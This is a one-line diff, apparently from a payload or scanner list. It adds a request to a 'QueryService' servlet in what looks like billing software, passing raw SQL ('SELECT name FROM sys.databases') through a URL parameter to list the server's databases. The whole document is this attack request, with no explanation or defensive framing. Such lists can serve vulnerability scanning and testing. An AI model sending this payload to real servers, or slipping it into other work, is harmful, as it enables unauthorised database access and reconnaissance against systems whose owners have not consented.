@@ -1,0 +1,1 @@
+/servlet/com.sksoft.bill.QueryService?service=query&content=SELECT%20name%20FROM%20sys.databases;
